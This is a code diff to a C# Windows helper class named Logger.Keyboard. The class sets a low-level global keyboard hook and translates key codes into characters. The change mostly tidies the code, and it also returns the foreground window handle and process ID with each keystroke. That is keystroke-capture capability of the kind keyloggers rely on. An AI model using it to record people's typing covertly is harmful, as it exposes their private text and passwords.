@@ -1,14 +1,15 @@
 ﻿using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
-using System.Runtime.CompilerServices;
 
 namespace Logger.Keyboard
 {
+    using WindowHandle = IntPtr;
+
     /// <summary>
     /// WinAPI Key interception helper class.
     /// </summary>
-    internal static class WinAPI
+    static class WinAPI
     {
         public delegate IntPtr LowLevelKeyboardProc(int nCode, UIntPtr wParam, IntPtr lParam);
         public static int WH_KEYBOARD_LL = 13;
@@ -85,7 +86,7 @@ namespace Logger.Keyboard
         public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);
 
         [DllImport("User32.dll")]
-        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
 
         [DllImport("user32.dll")]
         private static extern bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);
@@ -104,7 +105,7 @@ namespace Logger.Keyboard
         /// <param name="VKCode">VKCode</param>
         /// <param name="isKeyDown">Is the key down event?</param>
         /// <returns>String representing single unicode character.</returns>
-        public static string VKCodeToString(uint VKCode, bool isKeyDown)
+        public static string VKCodeToString(uint VKCode, bool isKeyDown, out WindowHandle windowHandle, out uint currentProcessID)
         {
             // ToUnicodeEx needs StringBuilder, it populates that during execution.
             System.Text.StringBuilder sbString = new System.Text.StringBuilder(5);
@@ -114,9 +115,8 @@ namespace Logger.Keyboard
             bool isDead = false;
 
             // Gets the current windows window handle, threadID, processID
-            IntPtr currentHWnd = GetForegroundWindow();
-            uint currentProcessID;
-            uint currentWindowThreadID = GetWindowThreadProcessId(currentHWnd, out currentProcessID);
+            windowHandle = GetForegroundWindow();
+            uint currentWindowThreadID = GetWindowThreadProcessId(windowHandle, out currentProcessID);
 
             // This programs Thread ID
             uint thisProgramThreadId = GetCurrentThreadId();
@@ -180,7 +180,7 @@ namespace Logger.Keyboard
             }
 
             // We inject the last dead key back, since ToUnicodeEx removed it.
-            if (lastVKCode != 0 && !String.IsNullOrEmpty(ret))
+            if (lastVKCode != 0 && !string.IsNullOrEmpty(ret))
             {
                 System.Text.StringBuilder sbTemp = new System.Text.StringBuilder(5);
                 ToUnicodeEx(lastVKCode, lastScanCode, lastKeyState, sbTemp, sbTemp.Capacity, (uint)0, HKL);
@@ -207,7 +207,7 @@ namespace Logger.Keyboard
             int rc;
             do
             {
-                byte[] lpKeyStateNull = new Byte[255];
+                byte[] lpKeyStateNull = new byte[255];
                 rc = ToUnicodeEx(vk, sc, lpKeyStateNull, sb, sb.Capacity, 0, hkl);
             } while (rc < 0);
         }
